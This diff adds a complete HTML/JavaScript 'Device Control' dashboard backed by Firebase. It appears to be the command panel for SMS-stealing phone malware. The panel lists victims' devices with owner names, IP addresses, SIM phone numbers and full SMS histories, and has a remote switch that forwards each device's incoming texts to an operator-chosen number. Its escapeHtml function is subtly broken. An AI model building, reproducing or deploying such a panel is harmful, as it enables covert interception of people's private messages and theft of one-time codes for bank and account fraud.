@@ -1,0 +1,880 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Device Control</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-0: #000000;
+    --bg-1: #0a0a0f;
+    --bg-2: #14141c;
+    --surface: rgba(28, 28, 36, 0.72);
+    --surface-2: rgba(44, 44, 56, 0.6);
+    --stroke: rgba(255, 255, 255, 0.08);
+    --stroke-strong: rgba(255, 255, 255, 0.14);
+    --text: #f5f5f7;
+    --text-dim: #98989f;
+    --text-faint: #6e6e76;
+    --blue: #0a84ff;
+    --green: #30d158;
+    --red: #ff453a;
+    --orange: #ff9f0a;
+    --purple: #bf5af2;
+    --pink: #ff375f;
+    --teal: #64d2ff;
+    --grad-blue: linear-gradient(135deg, #0a84ff 0%, #5e5ce6 100%);
+    --grad-green: linear-gradient(135deg, #30d158 0%, #64d2ff 100%);
+    --grad-pink: linear-gradient(135deg, #ff375f 0%, #bf5af2 100%);
+    --grad-orange: linear-gradient(135deg, #ff9f0a 0%, #ff375f 100%);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", system-ui, sans-serif;
+    background: var(--bg-0);
+    color: var(--text);
+    overflow: hidden;
+    letter-spacing: -0.01em;
+    -webkit-font-smoothing: antialiased;
+  }
+  /* Ambient glow background */
+  body::before, body::after {
+    content: ""; position: fixed; pointer-events: none; z-index: 0;
+    width: 700px; height: 700px; border-radius: 50%;
+    filter: blur(120px); opacity: 0.35;
+  }
+  body::before {
+    background: radial-gradient(circle, #0a84ff 0%, transparent 70%);
+    top: -200px; left: -200px;
+    animation: float1 20s ease-in-out infinite;
+  }
+  body::after {
+    background: radial-gradient(circle, #bf5af2 0%, transparent 70%);
+    bottom: -200px; right: -200px;
+    animation: float2 25s ease-in-out infinite;
+  }
+  @keyframes float1 {
+    0%,100% { transform: translate(0,0); }
+    50% { transform: translate(100px, 80px); }
+  }
+  @keyframes float2 {
+    0%,100% { transform: translate(0,0); }
+    50% { transform: translate(-120px, -60px); }
+  }
+
+  .app { position: relative; z-index: 1; display: flex; height: 100vh; }
+
+  /* ---------- SIDEBAR ---------- */
+  .sidebar {
+    width: 360px;
+    background: rgba(10, 10, 15, 0.6);
+    backdrop-filter: blur(40px) saturate(180%);
+    -webkit-backdrop-filter: blur(40px) saturate(180%);
+    border-right: 1px solid var(--stroke);
+    display: flex; flex-direction: column;
+    flex-shrink: 0;
+  }
+  .topbar {
+    padding: 22px 20px 16px;
+    border-bottom: 1px solid var(--stroke);
+  }
+  .topbar-row {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 18px;
+  }
+  .brand {
+    display: flex; align-items: center; gap: 12px;
+  }
+  .brand-icon {
+    width: 38px; height: 38px; border-radius: 11px;
+    background: var(--grad-blue);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px;
+    box-shadow: 0 8px 24px rgba(10,132,255,0.4);
+  }
+  .brand h1 { font-size: 17px; font-weight: 700; letter-spacing: -0.02em; }
+  .brand p { font-size: 11px; color: var(--text-dim); font-weight: 500; }
+
+  .stats-row {
+    display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
+    margin-bottom: 14px;
+  }
+  .stat-pill {
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    border-radius: 14px;
+    padding: 10px 8px;
+    text-align: center;
+    backdrop-filter: blur(20px);
+  }
+  .stat-pill .num {
+    font-size: 20px; font-weight: 700; letter-spacing: -0.03em;
+    background: var(--grad-blue);
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .stat-pill.green .num { background: var(--grad-green); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .stat-pill.pink .num { background: var(--grad-pink); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  .stat-pill .lbl {
+    font-size: 10px; color: var(--text-dim); font-weight: 600;
+    text-transform: uppercase; letter-spacing: 0.06em; margin-top: 2px;
+  }
+
+  .search-wrap {
+    position: relative;
+  }
+  .search-wrap svg {
+    position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+    color: var(--text-faint); width: 16px; height: 16px;
+  }
+  .search-wrap input {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    color: var(--text);
+    padding: 10px 14px 10px 36px;
+    border-radius: 12px;
+    font-size: 14px;
+    font-family: inherit;
+    outline: none;
+    transition: all 0.2s;
+  }
+  .search-wrap input:focus {
+    border-color: var(--blue);
+    background: rgba(28,28,36,0.9);
+    box-shadow: 0 0 0 4px rgba(10,132,255,0.15);
+  }
+  .search-wrap input::placeholder { color: var(--text-faint); }
+
+  .client-list {
+    flex: 1; overflow-y: auto;
+    padding: 12px;
+    scrollbar-width: thin;
+    scrollbar-color: rgba(255,255,255,0.1) transparent;
+  }
+  .client-list::-webkit-scrollbar { width: 6px; }
+  .client-list::-webkit-scrollbar-thumb {
+    background: rgba(255,255,255,0.1); border-radius: 3px;
+  }
+
+  .client-card {
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    border-radius: 16px;
+    padding: 14px;
+    margin-bottom: 8px;
+    cursor: pointer;
+    transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+    position: relative;
+    overflow: hidden;
+    animation: slideIn 0.4s ease-out backwards;
+  }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateX(-12px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  .client-card:hover {
+    background: var(--surface-2);
+    border-color: var(--stroke-strong);
+    transform: translateY(-1px);
+  }
+  .client-card.active {
+    background: linear-gradient(135deg, rgba(10,132,255,0.18), rgba(94,92,230,0.12));
+    border-color: rgba(10,132,255,0.5);
+    box-shadow: 0 8px 24px rgba(10,132,255,0.18);
+  }
+  .client-card-row {
+    display: flex; align-items: center; gap: 12px;
+  }
+  .avatar {
+    width: 42px; height: 42px; border-radius: 13px;
+    background: var(--grad-blue);
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700; font-size: 15px; color: white;
+    flex-shrink: 0;
+    box-shadow: 0 4px 12px rgba(10,132,255,0.3);
+  }
+  .avatar.g1 { background: var(--grad-green); box-shadow: 0 4px 12px rgba(48,209,88,0.3); }
+  .avatar.g2 { background: var(--grad-pink); box-shadow: 0 4px 12px rgba(255,55,95,0.3); }
+  .avatar.g3 { background: var(--grad-orange); box-shadow: 0 4px 12px rgba(255,159,10,0.3); }
+  .client-info { flex: 1; min-width: 0; }
+  .client-name {
+    font-size: 14px; font-weight: 600; color: var(--text);
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .client-sub {
+    font-size: 11.5px; color: var(--text-dim); margin-top: 2px;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    font-weight: 500;
+  }
+  .client-badges {
+    display: flex; flex-direction: column; align-items: flex-end; gap: 4px;
+  }
+  .status-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--text-faint);
+    box-shadow: 0 0 0 3px rgba(110,110,118,0.15);
+  }
+  .status-dot.on {
+    background: var(--green);
+    box-shadow: 0 0 0 3px rgba(48,209,88,0.2), 0 0 12px rgba(48,209,88,0.5);
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 0 3px rgba(48,209,88,0.2), 0 0 12px rgba(48,209,88,0.5); }
+    50% { box-shadow: 0 0 0 6px rgba(48,209,88,0.05), 0 0 16px rgba(48,209,88,0.7); }
+  }
+  .fwd-tag {
+    font-size: 9px; font-weight: 700; letter-spacing: 0.05em;
+    padding: 2px 6px; border-radius: 6px;
+    background: rgba(191,90,242,0.18); color: #d59cff;
+    border: 1px solid rgba(191,90,242,0.3);
+  }
+
+  /* ---------- MAIN ---------- */
+  .main {
+    flex: 1; overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: rgba(255,255,255,0.1) transparent;
+  }
+  .main::-webkit-scrollbar { width: 8px; }
+  .main::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 4px; }
+
+  .empty-state {
+    height: 100%; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; gap: 16px;
+    color: var(--text-dim); padding: 40px;
+  }
+  .empty-icon {
+    width: 80px; height: 80px; border-radius: 24px;
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 36px;
+    backdrop-filter: blur(20px);
+  }
+  .empty-state h2 { font-size: 18px; color: var(--text); font-weight: 600; }
+  .empty-state p { font-size: 13px; max-width: 280px; text-align: center; }
+
+  .detail { padding: 28px 32px 60px; animation: fadeUp 0.4s ease-out; }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Hero card */
+  .hero {
+    background: var(--surface);
+    backdrop-filter: blur(40px) saturate(180%);
+    border: 1px solid var(--stroke);
+    border-radius: 24px;
+    padding: 24px;
+    margin-bottom: 20px;
+    display: flex; align-items: center; gap: 20px;
+    position: relative; overflow: hidden;
+  }
+  .hero::before {
+    content: ""; position: absolute; inset: 0;
+    background: radial-gradient(circle at top right, rgba(10,132,255,0.15), transparent 60%);
+    pointer-events: none;
+  }
+  .hero-avatar {
+    width: 72px; height: 72px; border-radius: 22px;
+    background: var(--grad-blue);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px; font-weight: 700; color: white;
+    box-shadow: 0 10px 30px rgba(10,132,255,0.4);
+    flex-shrink: 0;
+    position: relative; z-index: 1;
+  }
+  .hero-info { flex: 1; min-width: 0; position: relative; z-index: 1; }
+  .hero-info h2 {
+    font-size: 24px; font-weight: 700; letter-spacing: -0.02em;
+    margin-bottom: 4px;
+  }
+  .hero-id {
+    font-size: 12px; color: var(--text-dim);
+    font-family: 'SF Mono', 'Menlo', monospace;
+    background: rgba(255,255,255,0.05);
+    padding: 2px 8px; border-radius: 6px;
+    display: inline-block; margin-bottom: 8px;
+  }
+  .hero-meta {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    font-size: 12px; color: var(--text-dim);
+  }
+  .status-chip {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 4px 10px; border-radius: 999px;
+    font-size: 11.5px; font-weight: 600;
+  }
+  .status-chip.on { background: rgba(48,209,88,0.15); color: #6ce793; }
+  .status-chip.off { background: rgba(110,110,118,0.18); color: var(--text-dim); }
+  .status-chip .d { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
+
+  /* SMS Forwarding card */
+  .fwd-card {
+    background: linear-gradient(135deg, rgba(191,90,242,0.1), rgba(10,132,255,0.06));
+    border: 1px solid rgba(191,90,242,0.25);
+    border-radius: 20px;
+    padding: 20px;
+    margin-bottom: 24px;
+    position: relative;
+    overflow: hidden;
+  }
+  .fwd-card::before {
+    content: ""; position: absolute; top: -50%; right: -10%;
+    width: 300px; height: 300px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(191,90,242,0.2), transparent 70%);
+    pointer-events: none;
+  }
+  .fwd-header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 14px; position: relative;
+  }
+  .fwd-title {
+    display: flex; align-items: center; gap: 12px;
+  }
+  .fwd-icon {
+    width: 36px; height: 36px; border-radius: 11px;
+    background: var(--grad-pink);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px;
+    box-shadow: 0 6px 16px rgba(255,55,95,0.35);
+  }
+  .fwd-title h3 { font-size: 15px; font-weight: 600; }
+  .fwd-title p { font-size: 12px; color: var(--text-dim); margin-top: 1px; }
+
+  /* iOS toggle */
+  .ios-switch {
+    position: relative;
+    width: 52px; height: 32px;
+    display: inline-block;
+  }
+  .ios-switch input { opacity: 0; width: 0; height: 0; }
+  .ios-switch .track {
+    position: absolute; cursor: pointer; inset: 0;
+    background: rgba(120,120,128,0.32);
+    border-radius: 999px;
+    transition: background 0.25s ease;
+  }
+  .ios-switch .track::before {
+    content: "";
+    position: absolute;
+    height: 28px; width: 28px; left: 2px; top: 2px;
+    background: white; border-radius: 50%;
+    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+  }
+  .ios-switch input:checked + .track { background: var(--green); }
+  .ios-switch input:checked + .track::before { transform: translateX(20px); }
+
+  .fwd-input-row {
+    display: flex; gap: 10px; position: relative;
+  }
+  .fwd-input-row input {
+    flex: 1;
+    background: rgba(10,10,15,0.6);
+    border: 1px solid var(--stroke);
+    color: var(--text);
+    padding: 12px 16px;
+    border-radius: 14px;
+    font-size: 14px;
+    font-family: inherit;
+    outline: none;
+    transition: all 0.2s;
+  }
+  .fwd-input-row input:focus {
+    border-color: var(--purple);
+    box-shadow: 0 0 0 4px rgba(191,90,242,0.15);
+  }
+  .btn-primary {
+    background: var(--grad-pink);
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 14px;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+    font-family: inherit;
+    box-shadow: 0 6px 16px rgba(255,55,95,0.3);
+    transition: all 0.2s;
+  }
+  .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 20px rgba(255,55,95,0.4); }
+  .btn-primary:active { transform: translateY(0) scale(0.97); }
+
+  .fwd-status {
+    font-size: 12px; color: var(--text-dim); margin-top: 10px;
+    position: relative;
+  }
+  .fwd-status b { color: #6ce793; font-weight: 600; }
+
+  /* Section */
+  .section-title {
+    display: flex; align-items: center; gap: 10px;
+    font-size: 13px; font-weight: 700;
+    color: var(--text-dim);
+    text-transform: uppercase; letter-spacing: 0.08em;
+    margin: 24px 0 12px 4px;
+  }
+  .section-title .count {
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    color: var(--text);
+    font-size: 11px; font-weight: 600;
+    padding: 2px 8px; border-radius: 999px;
+    text-transform: none; letter-spacing: 0;
+  }
+
+  /* Info grid */
+  .info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
+    gap: 10px;
+  }
+  .info-tile {
+    background: var(--surface);
+    backdrop-filter: blur(20px);
+    border: 1px solid var(--stroke);
+    border-radius: 16px;
+    padding: 14px 16px;
+    transition: all 0.2s;
+  }
+  .info-tile:hover {
+    border-color: var(--stroke-strong);
+    transform: translateY(-1px);
+  }
+  .info-tile .k {
+    font-size: 10.5px; color: var(--text-faint);
+    text-transform: uppercase; letter-spacing: 0.08em;
+    font-weight: 600;
+  }
+  .info-tile .v {
+    font-size: 15px; color: var(--text); font-weight: 600;
+    margin-top: 4px; word-break: break-word;
+    letter-spacing: -0.01em;
+  }
+
+  /* SIMs */
+  .sim-list { display: flex; flex-direction: column; gap: 8px; }
+  .sim-item {
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    border-radius: 14px;
+    padding: 12px 16px;
+    display: flex; align-items: center; gap: 12px;
+    font-size: 13px;
+  }
+  .sim-icon {
+    width: 32px; height: 32px; border-radius: 9px;
+    background: var(--grad-orange);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+  .sim-item b { color: var(--text); }
+  .sim-item span { color: var(--text-dim); }
+
+  /* Messages */
+  .msg-list { display: flex; flex-direction: column; gap: 8px; }
+  .msg {
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    border-radius: 16px;
+    padding: 14px 16px;
+    transition: all 0.2s;
+    position: relative;
+  }
+  .msg::before {
+    content: ""; position: absolute; left: 0; top: 12px; bottom: 12px;
+    width: 3px; border-radius: 0 3px 3px 0;
+    background: var(--blue);
+  }
+  .msg.outgoing::before { background: var(--green); }
+  .msg:hover { background: var(--surface-2); border-color: var(--stroke-strong); }
+  .msg-head {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 6px; gap: 12px;
+  }
+  .msg-sender {
+    font-size: 13px; font-weight: 600; color: var(--text);
+  }
+  .msg-to { color: var(--text-faint); font-weight: 500; }
+  .msg-time {
+    font-size: 11px; color: var(--text-faint);
+    white-space: nowrap;
+  }
+  .msg-body {
+    font-size: 13px; color: var(--text-dim);
+    line-height: 1.45; white-space: pre-wrap; word-break: break-word;
+  }
+
+  /* Raw JSON */
+  details.raw {
+    background: var(--surface);
+    border: 1px solid var(--stroke);
+    border-radius: 16px;
+    padding: 0;
+    overflow: hidden;
+    margin-top: 16px;
+  }
+  details.raw summary {
+    padding: 14px 16px;
+    cursor: pointer;
+    font-size: 13px; color: var(--text-dim); font-weight: 600;
+    list-style: none;
+    display: flex; align-items: center; gap: 8px;
+  }
+  details.raw summary::-webkit-details-marker { display: none; }
+  details.raw summary::before {
+    content: "▸"; transition: transform 0.2s; color: var(--text-faint);
+  }
+  details.raw[open] summary::before { transform: rotate(90deg); }
+  details.raw pre {
+    padding: 0 16px 16px;
+    font-family: 'SF Mono', 'Menlo', monospace;
+    font-size: 11px; color: var(--text-faint);
+    max-height: 320px; overflow: auto;
+    white-space: pre-wrap; word-break: break-word;
+  }
+
+  .empty-mini {
+    color: var(--text-faint); font-size: 13px;
+    padding: 16px; text-align: center;
+    background: var(--surface); border: 1px dashed var(--stroke);
+    border-radius: 14px;
+  }
+
+  /* Toast */
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(20px);
+    background: rgba(48,209,88,0.95);
+    color: white; padding: 12px 20px;
+    border-radius: 999px;
+    font-size: 13px; font-weight: 600;
+    box-shadow: 0 10px 30px rgba(48,209,88,0.4);
+    opacity: 0; pointer-events: none;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    z-index: 100;
+    backdrop-filter: blur(20px);
+  }
+  .toast.show {
+    opacity: 1; transform: translateX(-50%) translateY(0);
+  }
+
+  /* Mobile */
+  .mobile-back { display: none; }
+  @media (max-width: 820px) {
+    .app { flex-direction: column; }
+    .sidebar {
+      width: 100%; height: 100vh;
+      border-right: none;
+      transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .main {
+      position: fixed; inset: 0;
+      transform: translateX(100%);
+      transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+      background: var(--bg-0);
+      z-index: 5;
+    }
+    .app.show-detail .main { transform: translateX(0); }
+    .mobile-back {
+      display: inline-flex; align-items: center; gap: 4px;
+      background: var(--surface);
+      border: 1px solid var(--stroke);
+      color: var(--blue);
+      padding: 8px 14px 8px 10px;
+      border-radius: 999px;
+      font-size: 14px; font-weight: 500;
+      cursor: pointer; font-family: inherit;
+      margin-bottom: 16px;
+      backdrop-filter: blur(20px);
+    }
+    .detail { padding: 20px 16px 60px; }
+    .hero { padding: 18px; gap: 14px; }
+    .hero-avatar { width: 56px; height: 56px; font-size: 22px; border-radius: 17px; }
+    .hero-info h2 { font-size: 20px; }
+  }
+</style>
+</head>
+<body>
+<div class="app" id="app">
+  <aside class="sidebar">
+    <div class="topbar">
+      <div class="topbar-row">
+        <div class="brand">
+          <div class="brand-icon">📱</div>
+          <div>
+            <h1>Device Control</h1>
+            <p>Real-time monitoring</p>
+          </div>
+        </div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-pill"><div class="num" id="stat-total">0</div><div class="lbl">Total</div></div>
+        <div class="stat-pill green"><div class="num" id="stat-online">0</div><div class="lbl">Online</div></div>
+        <div class="stat-pill pink"><div class="num" id="stat-fwd">0</div><div class="lbl">Forward</div></div>
+      </div>
+      <div class="search-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"></circle><path d="m21 21-4.3-4.3"></path></svg>
+        <input id="search" placeholder="Search devices...">
+      </div>
+    </div>
+    <div class="client-list" id="client-list"></div>
+  </aside>
+  <main class="main" id="main">
+    <div class="empty-state">
+      <div class="empty-icon">📲</div>
+      <h2>No device selected</h2>
+      <p>Choose a device from the list to view its details, messages, and forwarding settings.</p>
+    </div>
+  </main>
+</div>
+<div class="toast" id="toast">Saved</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, onValue, set }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const firebaseConfig = {
+  databaseURL: "https://customer-375c9-default-rtdb.europe-west1.firebasedatabase.app"
+};
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+let clients = {};
+let forwards = {};
+let selectedId = null;
+let searchTerm = "";
+
+const listEl = document.getElementById("client-list");
+const mainEl = document.getElementById("main");
+const searchEl = document.getElementById("search");
+const appEl = document.getElementById("app");
+const toastEl = document.getElementById("toast");
+
+searchEl.addEventListener("input", e => {
+  searchTerm = e.target.value.toLowerCase();
+  renderList();
+});
+
+onValue(ref(db, "clients"), snap => {
+  clients = snap.val() || {};
+  renderStats(); renderList();
+  if (selectedId) renderDetail();
+});
+onValue(ref(db, "forwardSms"), snap => {
+  forwards = snap.val() || {};
+  renderStats(); renderList();
+  if (selectedId) renderDetail();
+});
+
+function renderStats() {
+  const ids = Object.keys(clients);
+  document.getElementById("stat-total").textContent = ids.length;
+  document.getElementById("stat-online").textContent = ids.filter(id => clients[id].status).length;
+  document.getElementById("stat-fwd").textContent =
+    Object.values(forwards).filter(f => f && f.enabled).length;
+}
+
+const avatarColors = ["", "g1", "g2", "g3"];
+function avatarClass(id) {
+  let h = 0; for (let i=0;i<id.length;i++) h = (h*31 + id.charCodeAt(i)) | 0;
+  return avatarColors[Math.abs(h) % avatarColors.length];
+}
+function initials(name) {
+  return name.split(/\s+/).map(p => p[0] || "").join("").slice(0,2).toUpperCase() || "?";
+}
+
+function renderList() {
+  const ids = Object.keys(clients).filter(id => {
+    if (!searchTerm) return true;
+    const c = clients[id];
+    return (
+      id.toLowerCase().includes(searchTerm) ||
+      (c.fullName || "").toLowerCase().includes(searchTerm) ||
+      (c.modelName || "").toLowerCase().includes(searchTerm) ||
+      (c.ip_address || "").toLowerCase().includes(searchTerm)
+    );
+  });
+  if (!ids.length) {
+    listEl.innerHTML = '<div class="empty-mini" style="margin-top:20px;">No devices found</div>';
+    return;
+  }
+  listEl.innerHTML = ids.map((id, i) => {
+    const c = clients[id];
+    const f = forwards[id];
+    const active = id === selectedId ? "active" : "";
+    const name = c.fullName || c.modelName || id;
+    return `
+      <div class="client-card ${active}" data-id="${id}" style="animation-delay:${Math.min(i*0.03, 0.3)}s">
+        <div class="client-card-row">
+          <div class="avatar ${avatarClass(id)}">${escapeHtml(initials(name))}</div>
+          <div class="client-info">
+            <div class="client-name">${escapeHtml(name)}</div>
+            <div class="client-sub">${escapeHtml(c.modelName || "Unknown")} · 🔋 ${escapeHtml(c.battery || "—")}</div>
+          </div>
+          <div class="client-badges">
+            <span class="status-dot ${c.status ? "on" : ""}"></span>
+            ${f && f.enabled ? '<span class="fwd-tag">FWD</span>' : ""}
+          </div>
+        </div>
+      </div>
+    `;
+  }).join("");
+  listEl.querySelectorAll(".client-card").forEach(el => {
+    el.addEventListener("click", () => {
+      selectedId = el.dataset.id;
+      appEl.classList.add("show-detail");
+      renderList();
+      renderDetail();
+    });
+  });
+}
+
+function renderDetail() {
+  const c = clients[selectedId];
+  if (!c) {
+    mainEl.innerHTML = '<div class="empty-state"><div class="empty-icon">⚠️</div><h2>Device removed</h2></div>';
+    return;
+  }
+  const f = forwards[selectedId] || { enabled: false, forwardTo: "" };
+  const name = c.fullName || c.modelName || selectedId;
+  const skip = new Set(["messages", "sims"]);
+  const infoTiles = Object.entries(c)
+    .filter(([k]) => !skip.has(k))
+    .map(([k, v]) => `
+      <div class="info-tile">
+        <div class="k">${escapeHtml(prettyKey(k))}</div>
+        <div class="v">${escapeHtml(formatValue(v))}</div>
+      </div>`).join("");
+
+  const sims = Array.isArray(c.sims) ? c.sims : [];
+  const simsHtml = sims.length ? sims.map((s, i) => `
+    <div class="sim-item">
+      <div class="sim-icon">📶</div>
+      <div>
+        <b>SIM ${i+1}</b> · <span>${escapeHtml(s.carrierName||"Unknown")}</span><br>
+        <span style="font-size:12px;">${escapeHtml(s.phoneNumber||"No number")} · Slot ${escapeHtml(s.simSlotIndex||"—")}</span>
+      </div>
+    </div>`).join("") : '<div class="empty-mini">No SIM data</div>';
+
+  const msgs = c.messages ? Object.values(c.messages).sort((a,b)=>(b.id||0)-(a.id||0)) : [];
+  const msgsHtml = msgs.length ? msgs.map(m => `
+    <div class="msg ${m.type === "outgoing" ? "outgoing" : ""}">
+      <div class="msg-head">
+        <div class="msg-sender">${escapeHtml(m.sender||"?")} <span class="msg-to">→ ${escapeHtml(m.receivedOn||"?")}</span></div>
+        <div class="msg-time">${escapeHtml(m.dateTime||"")}</div>
+      </div>
+      <div class="msg-body">${escapeHtml(m.message||"")}</div>
+    </div>`).join("") : '<div class="empty-mini">No messages</div>';
+
+  mainEl.innerHTML = `
+    <div class="detail">
+      <button class="mobile-back" id="back-btn">‹ Devices</button>
+      <div class="hero">
+        <div class="hero-avatar ${avatarClass(selectedId)}">${escapeHtml(initials(name))}</div>
+        <div class="hero-info">
+          <h2>${escapeHtml(name)}</h2>
+          <div class="hero-id">${selectedId}</div>
+          <div class="hero-meta">
+            <span class="status-chip ${c.status ? "on" : "off"}">
+              <span class="d"></span>${c.status ? "Online" : "Offline"}
+            </span>
+            <span style="align-self:center;">Joined ${escapeHtml(c.joined||"—")}</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="fwd-card">
+        <div class="fwd-header">
+          <div class="fwd-title">
+            <div class="fwd-icon">📤</div>
+            <div>
+              <h3>SMS Forwarding</h3>
+              <p>Forward incoming messages to another number</p>
+            </div>
+          </div>
+          <label class="ios-switch">
+            <input type="checkbox" id="fwd-toggle" ${f.enabled ? "checked" : ""}/>
+            <span class="track"></span>
+          </label>
+        </div>
+        <div class="fwd-input-row">
+          <input id="fwd-number" placeholder="+1234567890" value="${escapeHtml(f.forwardTo||"")}"/>
+          <button class="btn-primary" id="fwd-save">Save</button>
+        </div>
+        <div class="fwd-status" id="fwd-status">
+          ${f.enabled
+            ? `Forwarding active → <b>${escapeHtml(f.forwardTo||"(no number set)")}</b>`
+            : "Forwarding disabled"}
+        </div>
+      </div>
+
+      <div class="section-title">Device Info <span class="count">${Object.keys(c).filter(k=>!skip.has(k)).length}</span></div>
+      <div class="info-grid">${infoTiles}</div>
+
+      <div class="section-title">SIM Cards <span class="count">${sims.length}</span></div>
+      <div class="sim-list">${simsHtml}</div>
+
+      <div class="section-title">Messages <span class="count">${msgs.length}</span></div>
+      <div class="msg-list">${msgsHtml}</div>
+
+      <details class="raw">
+        <summary>Raw JSON</summary>
+        <pre>${escapeHtml(JSON.stringify(c, null, 2))}</pre>
+      </details>
+    </div>
+  `;
+
+  const backBtn = document.getElementById("back-btn");
+  if (backBtn) backBtn.addEventListener("click", () => {
+    appEl.classList.remove("show-detail");
+    selectedId = null;
+    renderList();
+    mainEl.innerHTML = '<div class="empty-state"><div class="empty-icon">📲</div><h2>No device selected</h2><p>Choose a device from the list to view its details.</p></div>';
+  });
+
+  document.getElementById("fwd-toggle").addEventListener("change", async e => {
+    const enabled = e.target.checked;
+    const number = document.getElementById("fwd-number").value.trim();
+    await set(ref(db, `forwardSms/${selectedId}`), { enabled, forwardTo: number });
+    showToast(enabled ? "Forwarding enabled" : "Forwarding disabled");
+  });
+  document.getElementById("fwd-save").addEventListener("click", async () => {
+    const number = document.getElementById("fwd-number").value.trim();
+    const enabled = document.getElementById("fwd-toggle").checked;
+    await set(ref(db, `forwardSms/${selectedId}`), { enabled, forwardTo: number });
+    showToast("Saved ✓");
+  });
+}
+
+function showToast(msg) {
+  toastEl.textContent = msg;
+  toastEl.classList.add("show");
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => toastEl.classList.remove("show"), 1800);
+}
+
+function prettyKey(k) {
+  return k.replace(/_/g, ' ').replace(/([A-Z])/g, ' $1').replace(/\s+/g,' ').trim();
+}
+function formatValue(v) {
+  if (v === null || v === undefined) return "—";
+  if (typeof v === "boolean") return v ? "Yes" : "No";
+  if (typeof v === "object") return JSON.stringify(v);
+  return String(v) || "—";
+}
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, c => ({"&":"&","<":"<",">":">",'"':""","'":"'"}[c]));
+}
+</script>
+
+
+</body></html>
